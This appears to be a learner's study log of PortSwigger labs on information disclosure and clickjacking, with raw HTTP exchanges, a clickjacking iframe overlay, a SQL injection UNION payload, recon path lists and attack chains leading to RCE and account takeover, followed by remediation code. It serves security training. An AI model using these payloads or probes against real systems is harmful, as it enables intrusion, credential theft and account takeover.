# Day 42 — Information Disclosure + Clickjacking

---

## 1. Foundation

### Information Disclosure

**What This Technology Is Actually For**

Applications generate verbose error messages, stack traces, and debug output during development to help engineers locate bugs quickly. Backup files and temp copies get left in directories during active development. Directory listings are commonly enabled in local environments for easy file browsing.

**The Exact Developer Assumption That Breaks**

- Verbose error handling is a dev-only concern — it will be stripped before production
- Backup files left in the webroot are internal copies nobody will discover
- Directory browsing being enabled in dev is harmless because the paths aren't documented

**Root Cause — Mechanical Explanation**

Three distinct failure modes:

1. **Error messages**: The application does not sanitize exception output before writing to the HTTP response. Java's default exception handler dumps the full `Exception.toString()` + stack trace directly into the HTTP response body. Class names, file paths, library versions, and framework identifiers all appear.

2. **Backup files**: Developers create `.bak`, `.old`, `.java`, `.swp` copies during editing and forget to remove them after deployment. The web server has no concept of "this file type should not be served" — if a file exists in the webroot and is readable, the server will return it.

3. **Directory listing**: Apache with `Options +Indexes` or Nginx with `autoindex on` generates an HTML index listing for any directory that lacks an `index.html`. The `/backup` directory had no index file so the server auto-generated the listing.

**Downstream Impact Chain**

```
Framework version → CVE lookup → known public exploit → RCE
Hardcoded credentials → DB access → full data exfiltration
Internal file paths → directory enumeration → discover more hidden files
Source code → read business logic → identify injection points and auth bypasses
```

---

### Clickjacking

**What This Technology Is Actually For**

Browsers allow any website to embed any URL in an `<iframe>` by default. This enables legitimate use: YouTube embeds, Google Maps, payment widgets, customer support chat, social sharing buttons.

**The Exact Developer Assumption That Breaks**

Pages with sensitive actions (Delete Account, Transfer Funds, Change Email, Grant Admin) are assumed to be accessed only when a user directly navigates to that URL — not embedded invisibly inside a third-party attacker page.

**Root Cause — Mechanical Explanation**

Without `X-Frame-Options` or `Content-Security-Policy: frame-ancestors`, browsers allow any page to embed any URL in an iframe. The attack:

1. Attacker hosts a page with an `<iframe>` pointing to the target sensitive page
2. The iframe opacity is set near-zero — visually invisible but fully present in the DOM
3. A decoy element (a visible fake button) is positioned at the exact pixel coordinates where the sensitive action button exists inside the iframe
4. The iframe z-index is set higher than the decoy element — clicks hit the iframe layer, not the text below it
5. Victim believes they clicked a harmless button; the click registered on the sensitive action inside their authenticated iframe session

**Why CSS Opacity Keeps Pointer Events Alive**

CSS `opacity` controls visual transparency but does not affect pointer events. An element with `opacity: 0.001` is completely invisible but still intercepts all mouse clicks. This is different from `visibility: hidden` (no rendering, but pointer events remain) and `display: none` (no layout, no pointer events at all). Opacity is the right choice for clickjacking: invisible AND click-capturing.

**Why Clickjacking Bypasses CSRF Protection**

CSRF protection verifies that a cross-origin request carries a valid token from the same-origin session. Clickjacking does not forge a cross-origin request. The victim makes the request themselves — from their own browser, in their own session, on the real page loaded in the iframe. The CSRF token is legitimately present and submitted. The protection that prevents clickjacking is `X-Frame-Options` / `frame-ancestors`, not CSRF tokens. This distinction matters in bug bounty reports — some triagers will incorrectly push back with "but it has CSRF tokens."

---

## 2. Labs

### Lab 1 — Information Disclosure in Error Messages

**Goal:** Trigger a verbose error response that leaks the framework version.

**Attack Approach:** Send a non-integer value as `productId`. The server calls `Integer.parseInt(productId)` internally. Sending `"test"` (with literal double-quote characters) forces `NumberFormatException`. The application has no exception handler — the raw Java exception including the full call stack is written to the HTTP 500 body. The framework identifier appears at the bottom of the stack trace.

#### Raw Request

```
GET /product?productId="test" HTTP/2
Host: 0a0b00e204bb2c3e80014461005d0082.web-security-academy.net
Cookie: session=hpMbv7NM2QMG4Xjakt9uTeN6bSudL0kR
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0b00e204bb2c3e80014461005d0082.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

#### Raw Response

```
HTTP/2 500 Internal Server Error
Content-Length: 1688

Internal Server Error: java.lang.NumberFormatException: For input string: ""test""
at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:67)
at java.base/java.lang.Integer.parseInt(Integer.java:647)
at java.base/java.lang.Integer.parseInt(Integer.java:777)
at lab.a.mm.v.o.h(Unknown Source)
at lab.s.gn.l.n.K(Unknown Source)
at lab.s.gn.v.x.y.c(Unknown Source)
at lab.s.gn.v.d.lambda$handleSubRequest$0(Unknown Source)
at m.d.t.h.lambda$null$3(Unknown Source)
at m.d.t.h.P(Unknown Source)
at m.d.t.h.lambda$uncheckedFunction$4(Unknown Source)
at java.base/java.util.Optional.map(Optional.java:260)
at lab.s.gn.v.d.q(Unknown Source)
at lab.server.s.a.t.b(Unknown Source)
at lab.s.gn.f.z(Unknown Source)
at lab.s.gn.f.b(Unknown Source)
at lab.server.s.a.a.w.L(Unknown Source)
at lab.server.s.a.a.e.lambda$handle$0(Unknown Source)
at lab.a.w.d.p.u(Unknown Source)
at lab.server.s.a.a.e.u(Unknown Source)
at lab.server.s.a.c.R(Unknown Source)
at m.d.t.h.lambda$null$3(Unknown Source)
at m.d.t.h.P(Unknown Source)
at m.d.t.h.lambda$uncheckedFunction$4(Unknown Source)
at lab.server.m_.z(Unknown Source)
at lab.server.s.a.c.N(Unknown Source)
at lab.server.s.g.x.C(Unknown Source)
at lab.server.s.o.L(Unknown Source)
at lab.server.s.x.L(Unknown Source)
at lab.server.ma.C(Unknown Source)
at lab.server.ma.u(Unknown Source)
at lab.d.i.lambda$consume$0(Unknown Source)
at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1144)
at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:642)
at java.base/java.lang.Thread.run(Thread.java:1583)
Apache Struts 2 2.3.31
```

**Payload Breakdown**

| Component | Value | Why |
|-----------|-------|-----|
| Endpoint | `/product?productId=` | Server expects integer; uses Integer.parseInt() internally |
| Payload | `"test"` | Literal quote chars included — not a valid integer |
| Exception | `NumberFormatException: For input string: ""test""` | Unhandled — full stack trace written to HTTP 500 body |
| Info leaked | `Apache Struts 2 2.3.31` | Framework + exact version — last line of stack trace |

**Mechanical Flow**

```
Request: GET /product?productId="test"
  ↓
Server: Integer.parseInt("\"test\"")
  ↓
Throws: NumberFormatException (no try/catch in handler)
  ↓
Default Java exception handler invoked
  ↓
Full stack trace written to HTTP 500 response body
  ↓
Bottom of trace reveals: "Apache Struts 2 2.3.31"
  ↓
Lab solved: submit version string
```

**Real-World Impact**

Apache Struts 2.3.31 is vulnerable to CVE-2017-5638 (CVSS 10.0). Exploitation is via a malformed Content-Type header containing OGNL expressions that execute arbitrary Java code server-side. This exact chain — version disclosure via error response → CVE-2017-5638 → RCE — caused the Equifax breach in 2017. 147 million records exposed. The framework version leak was the reconnaissance pivot point.

---

### Lab 2 — Source Code Disclosure via Backup Files

**Goal:** Find backup files in the webroot containing source code with hardcoded credentials.

**Attack Approach:**
1. Navigate to `/backup` — directory listing enabled, server generates file listing (no index.html present)
2. Retrieve `ProductTemplate.java.bak` — full Java source code returned as text/plain
3. Source code contains hardcoded PostgreSQL password — submit it to solve

#### Request 1 — Directory Listing

```
GET /backup HTTP/2
Host: 0a920011048115638010539f00bd0098.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```

#### Response 1 — Directory Listing

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=vBO6LKSI5eGI7grmxC35nTzIf36SsY7F; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 435

<html>
    <head>
        <title>Index of /backup</title>
        <style>
            table { margin: 1em; }
            td { padding: 0.2em; }
        </style>
    </head>
    <body>
        <h1>Index of /backup</h1>
        <table>
            <tr><th>Name</th><th>Size</th></tr>
            <tr><td><a href='/backup/ProductTemplate.java.bak'>ProductTemplate.java.bak</a></td><td>1647B</td></tr>
        </table>
    </body>
</html>
```

#### Request 2 — Retrieve Backup File

```
GET /backup/ProductTemplate.java.bak HTTP/2
Host: 0a920011048115638010539f00bd0098.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

#### Response 2 — Source Code

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
Set-Cookie: session=Ffl9b3zt4pZT8QW6TQaSrAKVtcK2h5H9; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 1667

package data.productcatalog;
import common.db.JdbcConnectionBuilder;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;
    private final String id;
    private transient Product product;
    public ProductTemplate(String id)
    {
        this.id = id;
    }
    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();
        ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "7jwndb2yprg2slu7wrgs5wh0899mx27u"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }
    public String getId() { return id; }
    public Product getProduct() { return product; }
}
```

**Payload Breakdown**

| Step | Action | Result |
|------|--------|--------|
| 1 | GET /backup | Autoindex listing reveals ProductTemplate.java.bak |
| 2 | GET /backup/ProductTemplate.java.bak | Full Java source returned as text/plain |
| Credential | `7jwndb2yprg2slu7wrgs5wh0899mx27u` | PostgreSQL password hardcoded in source |
| DB host | localhost:5432 | Standard PostgreSQL port |
| DB user | postgres | Superuser — full access to all databases |

**Mechanical Flow**

```
GET /backup
  → No index.html in directory
  → Apache autoindex generates HTML file listing
  → ProductTemplate.java.bak revealed

GET /backup/ProductTemplate.java.bak
  → File exists in webroot (developer forgot to remove after edit)
  → Server reads and returns file as text/plain
  → Source code visible: ConnectionBuilder.from(..., "7jwndb2yprg2slu7wrgs5wh0899mx27u")
  → Password extracted → submitted → lab solved
```

**Hidden Vulnerability Chain in the Source Code**

The backup file does not just leak credentials — it reveals three attack surfaces stacked together.

Vulnerability 1 — Hardcoded Credentials (immediate):
```
DB: postgresql://postgres:7jwndb2yprg2slu7wrgs5wh0899mx27u@localhost:5432/postgres
→ If port 5432 is network-accessible: psql direct login → full data exfiltration
```

Vulnerability 2 — SQL Injection (source-confirmed):
```java
String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
```
String concatenation directly into the query with no parameterized statement. Classic SQLi sink. The `id` field comes from the deserialized ProductTemplate object — meaning any code path that deserializes a ProductTemplate controls this SQL query.

Example payload if id = `' UNION SELECT password FROM users-- `:
```sql
SELECT * FROM products WHERE id = '' UNION SELECT password FROM users-- ' LIMIT 1
```

Vulnerability 3 — Insecure Deserialization chain (connects to Day 41):
```java
public class ProductTemplate implements Serializable {
    private void readObject(ObjectInputStream inputStream) ... {
        inputStream.defaultReadObject();
        // opens DB connection using this.id
        // executes SQL query using this.id
    }
}
```
Custom `readObject` opens a DB connection and executes a SQL query on deserialization. If an attacker can pass a crafted serialized ProductTemplate to any endpoint that deserializes it, the `id` field is attacker-controlled. The readObject method becomes a SQLi gadget — SQL injection executes during deserialization without ever touching the normal app input layer.

Full cascade: **backup file → source code → creds + SQLi sink + deserialization gadget**. One information disclosure finding unlocks three separate critical attack paths.

---

### Lab 3 — Clickjacking via Exploit Server

**Goal:** Trick a logged-in victim into performing a sensitive action by overlaying a transparent iframe over a fake button.

**Attack Approach:**
1. Open Exploit Server
2. Write HTML with an iframe pointing to /my-account (victim's session cookie loads with it)
3. Set iframe opacity to 0.1 — faintly visible for pixel-alignment calibration
4. Position the decoy div at the exact pixel coordinates of the real sensitive action button inside the iframe
5. Reduce opacity further to near-invisible
6. Deliver exploit — victim clicks "click me", click registers on the hidden action

#### Exact HTML Payload

```html
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity:0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:525px;
        left:60px;
        z-index: 1;
    }
</style>
<div>click me</div>
<iframe src="https://0a2700fe0420e71180f5c69100c500d8.web-security-academy.net/my-account"></iframe>
```

**Payload Breakdown**

| CSS Property | Value | Purpose |
|---|---|---|
| iframe z-index: 2 | Higher than div | iframe sits on top — clicks hit this layer first |
| div z-index: 1 | Lower than iframe | Decoy text sits below iframe — visible through transparency |
| iframe opacity: 0.1 | Near-transparent | User sees "click me"; iframe barely visible for alignment calibration |
| div top: 525px | Calibrated | Pixel-aligned to where sensitive button lives in the iframe |
| div left: 60px | Calibrated | Same — verified by temporarily raising iframe opacity during setup |
| iframe position: relative | — | In normal flow; establishes stacking context |
| div position: absolute | — | Placed at exact coordinates regardless of document flow |

**Critical z-index Clarification**

Counter-intuitive: the iframe has z-index: 2 (higher) and the div has z-index: 1 (lower). The iframe sits visually on top. The user sees "click me" because the iframe is nearly transparent — light passes through visually — but the iframe is still physically there and on top in the event stack. When the victim clicks, their cursor is in the iframe's z-layer (higher priority). The click registers on the iframe's content at that pixel position, which is where the sensitive action button is located inside /my-account.

**Mechanical Flow**

```
Victim opens exploit link → attacker page loads in browser
  ↓
iframe: GET /my-account → victim's session cookie sent automatically
  ↓
/my-account loads inside iframe with victim's full authenticated session
  ↓
No X-Frame-Options on /my-account → browser allows iframe embedding
  ↓
Victim sees: only "click me" div text (iframe is near-transparent)
  ↓
Victim clicks "click me"
  ↓
Click hits iframe layer (z-index: 2 = higher priority)
  ↓
Registers on sensitive action button at (525px, 60px) inside the iframe
  ↓
Sensitive action executes as victim's own authenticated request
  ↓
Lab solved
```

---

## 3. Chain Thinking — Attack Paths

### Path A — Error Message to RCE

```
GET /product?productId="test"
  → HTTP 500 Internal Server Error
  → Full Java stack trace in response body
  → "Apache Struts 2 2.3.31" revealed at bottom
  → CVE-2017-5638 lookup (CVSS 10.0, public exploit available)
  → Exploit: malformed Content-Type header with OGNL expression
  → OGNL evaluated server-side
  → OS command execution
  → Full system compromise
```

Real case: Equifax 2017. Same version. Same disclosure mechanism. 147 million records.

### Path B — Backup File to Multi-Surface Attack

```
GET /backup
  → Directory listing enabled → ProductTemplate.java.bak found

GET /backup/ProductTemplate.java.bak
  → Full source code returned

Source reveals:
├── Hardcoded creds: postgres:7jwndb2yprg2slu7wrgs5wh0899mx27u@localhost:5432
│     → If DB port accessible: psql direct access → full data dump
│
├── SQLi sink: String.format("SELECT * FROM products WHERE id = '%s'", id)
│     → payload: ' UNION SELECT password FROM users--
│     → extract all credentials via UNION injection
│
└── Serializable + readObject that executes the same SQLi sink
      → craft malicious serialized ProductTemplate with id = SQLi payload
      → send to any deserializing endpoint
      → readObject fires → SQLi executes during deserialization
      → data extraction without needing direct DB port access
```

### Path C — Clickjacking to Account Takeover

```
GET /my-account
  → Response has no X-Frame-Options → iframe embedding allowed

Attacker page:
  iframe (opacity ~0, z-index 2) → loads /my-account with victim session
  div (z-index 1, "click me") → aligned over "Change Email" button at (525px, 60px)

Victim clicks "click me"
  → click hits iframe → "Change Email" button clicked
  → email changed to attacker@evil.com
  → attacker requests password reset for victim account
  → reset link delivered to attacker email
  → full account takeover
```

Other sensitive actions reachable via same mechanism:
- "Delete Account" → account DoS on victim
- "Transfer Funds" → financial fraud
- "Grant Admin Role" → privilege escalation

---

## 4. Bug Bounty Context

### Information Disclosure

**Severity depends on what is disclosed:**

| Finding | Severity | Notes |
|---|---|---|
| Framework version in error | P4 → P1 | P4 alone; P1 if known CVE with public exploit exists |
| Internal stack trace | P4 | Reveals code structure and library versions |
| Hardcoded DB credentials | P1 | Direct DB access = full data compromise |
| Hardcoded API keys | P1-P2 | Depends on what the key can access |
| .git directory exposed | P2 → P1 | Full source history; deleted secrets still in git objects |
| Backup files with source code | P3 → P1 | P1 if source reveals creds or exploitable code paths |

**Recon checklist — paths to always probe:**

```
/backup, /.git, /.git/HEAD, /source, /src, /debug
/.env, /config.yml, /phpinfo.php
/actuator, /actuator/env, /actuator/heapdump
/console, /swagger-ui.html, /api-docs, /v2/api-docs
robots.txt    (devs list what they want hidden — revealing by design)
sitemap.xml   (exposes all routes)
```

Backup extensions to append to known filenames:
```
index.php.bak, config.yml.bak, database.js.old
settings.py~, web.config.bak, application.properties.swp
```

Error-triggering techniques to leak version info:
```
?id="test"       → integer parse error → stack trace
?id[]=1          → array instead of scalar → type error
X-Debug: 1       → may enable debug mode headers
?debug=true      → may expose debug panel
```

**Key point:** Info disclosure is often a P4 in isolation but a critical force multiplier — it guides all further attacks. Always document it and check the leaked version against CVE databases before assigning final severity.

### Clickjacking

**Severity depends entirely on the action clickjacked:**

| Action | Severity |
|---|---|
| Transfer funds | P1/Critical |
| Change email → enables ATO | P2/High |
| Grant admin access | P2/High |
| Delete account | P3/Medium |
| Post content as victim | P3/Medium |
| Unsubscribe from security alerts | P3-P4 |
| Marketing opt-in/out | Informational |

**Requirements for a valid clickjacking report:**

1. No X-Frame-Options: DENY or SAMEORIGIN header on the target page
2. No Content-Security-Policy: frame-ancestors directive
3. Target action is security-relevant (not just cosmetic)
4. Action can be triggered with a single click or predictable multiple clicks
5. Required user interaction is realistic — no complex typing needed

**The CSRF objection — anticipate this in bug bounty triage:**

Common pushback: "This page has CSRF tokens so clickjacking is not a valid finding."

Response: CSRF and clickjacking defend against different attacks. CSRF verifies cross-origin request integrity. Clickjacking does not forge a cross-origin request — the victim makes the request themselves, from their own browser, in their own session, on the real page loaded in the iframe. The CSRF token is present and valid. The protection that prevents clickjacking is `X-Frame-Options` / `frame-ancestors`, not CSRF tokens. Include this explanation explicitly in bug bounty reports to pre-empt incorrect triage closures.

---

## 5. Vulnerable vs Fixed Code

### Error Handling

**Vulnerable (Java Spring):**
```java
@GetMapping("/product")
public String getProduct(@RequestParam String productId) {
    int id = Integer.parseInt(productId);
    return productService.getById(id).toString();
}
// No exception handler configured
// Default dumps full stack trace to HTTP response body
```

**Fixed:**
```java
@GetMapping("/product")
public ResponseEntity<String> getProduct(@RequestParam String productId) {
    try {
        int id = Integer.parseInt(productId);
        return ResponseEntity.ok(productService.getById(id).toString());
    } catch (NumberFormatException e) {
        logger.error("Invalid productId: {}", productId, e); // internal only
        return ResponseEntity.status(400).body("Invalid product ID.");
    }
}

// application.properties (Spring Boot):
// server.error.include-stacktrace=never
// server.error.include-message=never
// server.error.include-exception=false
```

### Hardcoded Credentials + SQL Injection

**Vulnerable:**
```java
// Password hardcoded directly in source:
ConnectionBuilder.from(
    "org.postgresql.Driver", "postgresql", "localhost",
    5432, "postgres", "postgres", "7jwndb2yprg2slu7wrgs5wh0899mx27u"
);

// SQLi via string concatenation:
String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
```

**Fixed:**
```java
// Read credentials from environment variables or secrets manager:
String dbPassword = System.getenv("DB_PASSWORD");
ConnectionBuilder.from(
    "org.postgresql.Driver", "postgresql",
    System.getenv("DB_HOST"),
    Integer.parseInt(System.getenv("DB_PORT")),
    System.getenv("DB_USER"), System.getenv("DB_SCHEMA"),
    dbPassword
);

// Parameterized query — no string concatenation:
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM products WHERE id = ? LIMIT 1"
);
stmt.setString(1, id);
ResultSet rs = stmt.executeQuery();
```

### Directory Listing + Backup Files

**Vulnerable (Apache):**
```apache
Options +Indexes
# No restriction on backup extensions being served
```

**Fixed:**
```apache
# Disable directory listing
Options -Indexes

# Block backup and temp file extensions
<FilesMatch "\.(bak|old|orig|backup|swp|tmp|copy|1|~)$">
    Require all denied
</FilesMatch>

# Block sensitive directories from HTTP access
<DirectoryMatch "^.*(\.git|backup|src|source|\.svn).*$">
    Require all denied
</DirectoryMatch>
```

**Deployment-level fix:**
```
# Add to .gitignore and CI/CD deployment exclusion lists:
*.bak
*.old
*.swp
*.orig
/backup/
/.git/
/src/
```

### Clickjacking Headers

**Vulnerable:**
```http
HTTP/2 200 OK
Content-Type: text/html
# No X-Frame-Options
# No Content-Security-Policy frame-ancestors
```

**Fixed (HTTP headers):**
```http
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none';
```

**Fixed (Spring Security):**
```java
http.headers()
    .frameOptions().deny()
    .contentSecurityPolicy("frame-ancestors 'none'; default-src 'self'");
```

**X-Frame-Options vs CSP frame-ancestors:**
- `X-Frame-Options: DENY` — older header, broad browser support, binary (DENY or SAMEORIGIN only)
- `Content-Security-Policy: frame-ancestors 'none'` — newer, more granular, can whitelist specific trusted origins, overrides X-Frame-Options in browsers that support CSP
- Best practice: send both for maximum compatibility
- For sensitive action pages: always use DENY / frame-ancestors 'none', never SAMEORIGIN unless there is a documented legitimate same-origin embedding use case

---

## 6. Related PortSwigger Labs (Not Completed Today)

### Information Disclosure Labs

**Information disclosure on debug page**
A debug endpoint (e.g. /cgi-bin/phpinfo.php or /actuator) is left accessible in production. It exposes environment variables, server configuration, loaded modules, and internal runtime state. Different from stack traces — this is an intentional debug interface left open rather than a crash output leaking information.

**Information disclosure in version control history**
The .git directory is directly accessible via HTTP (GET /.git/HEAD returns "ref: refs/heads/main"). An attacker uses git-dumper to download the full repository including all commit history. Deleted files are recoverable from git's object store — secrets committed and removed in a later commit still exist in .git/objects and are fully retrievable.

**Authentication bypass via information disclosure**
The TRACE method or a verbose error reveals that the server checks an X-Custom-IP-Authorization header for local-origin access. An attacker adds this header with value 127.0.0.1. The server treats the request as originating from localhost and grants admin access without normal authentication. The information disclosure (revealing the header mechanism) enables the bypass.

### Clickjacking Labs

**Clickjacking with form input data prefilled before the attack**
Some actions require a text field (e.g. "Change email" requires entering an address). URL parameters prefill the field value (?email=attacker@evil.com), reducing required victim interaction to a single click on Submit. Demonstrates that form input fields do not prevent clickjacking — URL-based prefilling collapses multi-input flows to one click.

**Exploiting clickjacking vulnerability to trigger DOM-based XSS**
The clickjacked form submission triggers a JavaScript event that fires a DOM-based XSS payload in the victim's browser. Clickjacking acts as the delivery mechanism for script execution. Shows that UI redressing can chain directly into client-side code execution vulnerabilities.

**Multistep clickjacking**
The sensitive action requires multiple clicks (e.g. "Delete Account" then confirm "Yes, Delete"). The attacker builds separate overlay configurations for each step — first overlay targets the primary action, second targets the confirmation dialog. Demonstrates that multi-step confirmation flows do not prevent clickjacking — they only require multiple aligned overlays and multiple victim clicks.

---